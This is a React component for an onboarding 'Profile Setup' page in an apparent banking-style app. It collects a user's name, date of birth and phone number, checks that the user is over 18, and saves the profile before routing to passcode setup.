import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { User, Calendar, Phone, ChevronLeft, CheckCircle2, ShieldCheck } from 'lucide-react'
import { saveUser, getUser } from '../services/storageService'
import { useTame } from '../components/TameNotification'

export default function AccountInfo() {
  const navigate = useNavigate()
  const { push } = useTame()
  
  // Pre-populate if already in storage (e.g. from sign up or edit)
  const existingUser = getUser() || {}
  const telegram = sessionStorage.getItem('sxs_identifier') || existingUser.telegram || ''

  const [form, setForm] = useState({
    fullName: existingUser.fullName || '',
    dob: existingUser.dob || '',
    phone: existingUser.phone || '',
  })
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)

  const handleChange = (field) => (e) => {
    setForm({ ...form, [field]: e.target.value })
    setError('')
  }

  const handleSubmit = async () => {
    const { fullName, dob, phone } = form
    if (!fullName || !dob || !phone) {
      setError('All fields are required')
      return
    }

    // Validate phone number format (simple check)
    if (phone.length < 7) {
      setError('Please enter a valid phone number')
      return
    }

    // Validate age (e.g., must be at least 18 years old)
    const birthDate = new Date(dob)
    const today = new Date()
    let age = today.getFullYear() - birthDate.getFullYear()
    const m = today.getMonth() - birthDate.getMonth()
    if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
      age--
    }
    if (age < 18) {
      setError('You must be at least 18 years old to create an account')
      return
    }

    setLoading(true)
    setError('')

    try {
      await new Promise((r) => setTimeout(r, 1000))
      
      // Save user to local storage
      saveUser({
        ...form,
        telegram,
        email: existingUser.email || `${telegram.replace('@', '')}@telegram.stanbicx`,
      })

      push({
        type: 'success',
        title: 'Profile Info Saved',
        message: 'Your personal information has been secured. Next step: Passcode Setup.',
        duration: 4000,
      })

      navigate('/passcode')
    } catch (e) {
      setError(e.message || 'Failed to save account info')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="page" style={{ alignItems: 'flex-start', paddingTop: 40 }}>
      <div className="card animate-in" style={{ maxWidth: 480, margin: '0 auto' }}>
        
        {/* Back */}
        <button
          onClick={() => {
            const hasUser = localStorage.getItem('sxs_user');
            if (hasUser) {
              navigate('/devices');
            } else {
              navigate('/login');
            }
          }}
          className="btn btn-ghost btn-sm"
          style={{ width: 'auto', marginBottom: 20 }}
        >
          <ChevronLeft size={16} /> Exit Setup
        </button>

        {/* Header */}
        <div className="text-center mb-6">
          <div className="icon-badge cyan" style={{ margin: '0 auto 18px' }}>
            <User size={28} color="#fff" />
          </div>
          <h1 className="page-title">Profile Setup</h1>
          <p className="page-subtitle">Provide your basic information to configure your profile</p>
        </div>

        {/* Steps */}
        <div className="steps" style={{ marginBottom: 28 }}>
          {['Profile Setup', 'Passcode', 'Biometrics', 'KYC'].map((s, i) => (
            <div key={s} className={`step-item ${i < 0 ? 'done' : i === 0 ? 'active' : ''}`}>
              <div className="step-circle">{i < 0 ? <CheckCircle2 size={14} /> : i + 1}</div>
              <span className="step-label">{s}</span>
            </div>
          ))}
        </div>

        {/* Form Fields */}
        <div className="input-group">
          <label className="label">Full Legal Name</label>
          <div className="input-wrap">
            <span className="input-icon"><User size={16} /></span>
            <input
              id="setup-fullname"
              className="input"
              type="text"
              placeholder="e.g. John Doe"
              value={form.fullName}
              onChange={handleChange('fullName')}
            />
          </div>
        </div>

        <div className="input-group">
          <label className="label">Date of Birth</label>
          <div className="input-wrap">
            <span className="input-icon"><Calendar size={16} /></span>
            <input
              id="setup-dob"
              className="input"
              type="date"
              value={form.dob}
              onChange={handleChange('dob')}
              style={{ colorScheme: 'dark' }}
            />
          </div>
        </div>

        <div className="input-group">
          <label className="label">Phone Number</label>
          <div className="input-wrap">
            <span className="input-icon"><Phone size={16} /></span>
            <input
              id="setup-phone"
              className="input"
              type="tel"
              placeholder="e.g. +234 800 000 0000"
              value={form.phone}
              onChange={handleChange('phone')}
            />
          </div>
        </div>

        {error && (
          <div className="info-block red" style={{ marginBottom: 20 }}>
            <p style={{ color: 'var(--red)', fontSize: 13 }}>{error}</p>
          </div>
        )}

        <button
          id="setup-continue-btn"
          className="btn btn-primary"
          onClick={handleSubmit}
          disabled={loading}
        >
          {loading ? <div className="loader" /> : 'Continue to Passcode Setup'}
        </button>

        <div className="info-block mt-4">
          <ShieldCheck size={16} style={{ flexShrink: 0, marginTop: 1, color: 'var(--accent-hover)' }} />
          <p style={{ fontSize: 12 }}>
            Your information is stored locally and encrypted before transmission.
          </p>
        </div>
      </div>
    </div>
  )
}
